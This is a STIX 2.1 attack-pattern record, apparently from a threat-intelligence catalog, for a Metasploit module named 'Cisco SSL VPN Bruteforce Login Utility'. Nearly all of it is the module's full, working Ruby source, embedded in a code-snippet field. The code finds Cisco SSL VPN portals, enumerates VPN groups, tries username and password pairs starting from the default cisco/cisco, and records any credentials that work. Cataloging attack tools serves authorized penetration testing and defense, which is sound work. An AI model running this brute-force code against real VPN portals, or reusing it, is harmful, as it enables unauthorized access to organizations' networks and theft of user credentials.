{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--855e8985-8923-47cb-9b5b-ee065edce8e0",
    "created": "2024-08-14T16:29:32.409196Z",
    "modified": "2024-08-14T16:29:32.409201Z",
    "name": "Cisco SSL VPN Bruteforce Login Utility",
    "description": " This module scans for Cisco SSL VPN web login portals and performs login brute force to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_ssl_vpn.rb",
            "external_id": "cisco_ssl_vpn.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Cisco SSL VPN Bruteforce Login Utility',\n      'Description'    => %{\n        This module scans for Cisco SSL VPN web login portals and\n        performs login brute force to identify valid credentials.\n      },\n      'Author'         =>\n        [\n          'Jonathan Claudius <jclaudius[at]trustwave.com>'\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' =>\n        {\n          'SSL' => true,\n          'USERNAME' => 'cisco',\n          'PASSWORD' => 'cisco'\n        }\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('GROUP', [false, \"A specific VPN group to use\", ''])\n      ])\n    register_advanced_options(\n      [\n        OptBool.new('EmptyGroup', [true, \"Use an empty group with authentication requests\", false])\n      ])\n  end\n\n  def run_host(ip)\n    unless check_conn?\n      vprint_error(\"Connection failed, Aborting...\")\n      return false\n    end\n\n    unless is_app_ssl_vpn?\n      vprint_error(\"Application does not appear to be Cisco SSL VPN. Module will not continue.\")\n      return false\n    end\n\n    vprint_good(\"Application appears to be Cisco SSL VPN. Module will continue.\")\n\n    groups = Set.new\n    if datastore['EmptyGroup'] == true\n      groups << \"\"\n    elsif datastore['GROUP'].empty?\n      vprint_status(\"Attempt to Enumerate VPN Groups...\")\n      groups = enumerate_vpn_groups\n\n      if groups.empty?\n        vprint_warning(\"Unable to enumerate groups\")\n        vprint_warning(\"Using the default group: DefaultWEBVPNGroup\")\n        groups << \"DefaultWEBVPNGroup\"\n      else\n        vprint_good(\"Enumerated VPN Groups: #{groups.to_a.join(\", \")}\")\n      end\n\n    else\n      groups << datastore['GROUP']\n    end\n\n    vprint_status(\"Starting login brute force...\")\n    groups.each do |group|\n      each_user_pass do |user, pass|\n        do_login(user, pass, group)\n      end\n    end\n  end\n\n  # Verify whether the connection is working or not\n  def check_conn?\n    begin\n      res = send_request_cgi('uri' => '/', 'method' => 'GET')\n      if res\n        vprint_good(\"Server is responsive...\")\n        return true\n      end\n    rescue ::Rex::ConnectionRefused,\n           ::Rex::HostUnreachable,\n           ::Rex::ConnectionTimeout,\n           ::Rex::ConnectionError,\n           ::Errno::EPIPE\n    end\n    false\n  end\n\n  def get_login_resource\n    send_request_cgi(\n      'uri' => '/+CSCOE+/logon.html',\n      'method' => 'GET',\n      'vars_get' => { 'fcadbadd' => \"1\" }\n    )\n  end\n\n  def enumerate_vpn_groups\n    groups = Set.new\n    group_name_regex = /<select id=\"group_list\"  name=\"group_list\" style=\"z-index:1(?:; float:left;)?\" onchange=\"updateLogonForm\\(this\\.value,{(.*)}/\n\n    res = get_login_resource\n    if res && match = res.body.match(group_name_regex)\n      group_string = match[1]\n      groups = group_string.scan(/'([\\w\\-0-9]+)'/).flatten.to_set\n    end\n\n    groups\n  end\n\n  # Verify whether we're working with SSL VPN or not\n  def is_app_ssl_vpn?\n    res = get_login_resource\n    res && res.code == 200 && res.body.match(/webvpnlogin/)\n  end\n\n  def do_logout(cookie)\n    send_request_cgi(\n      'uri' => '/+webvpn+/webvpn_logout.html',\n      'method' => 'GET',\n      'cookie' => cookie\n    )\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'Cisco SSL VPN',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # Brute-force the login page\n  def do_login(user, pass, group)\n    vprint_status(\"Trying username:#{user.inspect} with password:#{pass.inspect} and group:#{group.inspect}\")\n\n    begin\n      cookie = \"webvpn=; \" +\n               \"webvpnc=; \" +\n               \"webvpn_portal=; \" +\n               \"webvpnSharePoint=; \" +\n               \"webvpnlogin=1; \" +\n               \"webvpnLang=en;\"\n\n      post_params = {\n        'tgroup'  => '',\n        'next'    => '',\n        'tgcookieset' => '',\n        'username' => user,\n        'password' => pass,\n        'Login'   => 'Logon'\n      }\n\n      post_params['group_list'] = group unless group.empty?\n\n      res = send_request_cgi(\n              'uri' => '/+webvpn+/index.html',\n              'method' => 'POST',\n              'ctype' => 'application/x-www-form-urlencoded',\n              'cookie' => cookie,\n              'vars_post' => post_params\n            )\n\n      if res &&\n         res.code == 200 &&\n         res.body.match(/SSL VPN Service/) &&\n         res.body.match(/webvpn_logout/i)\n\n        print_good(\"SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}\")\n\n        do_logout(res.get_cookies)\n\n        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)\n        report_note(ip: rhost, type: 'cisco.cred.group', data: \"User: #{user} / Group: #{group}\")\n        return :next_user\n\n      else\n        vprint_error(\"FAILED LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}\")\n      end\n\n    rescue ::Rex::ConnectionRefused,\n           ::Rex::HostUnreachable,\n           ::Rex::ConnectionTimeout,\n           ::Rex::ConnectionError,\n           ::Errno::EPIPE\n      vprint_error(\"HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n  end\nend\n"
}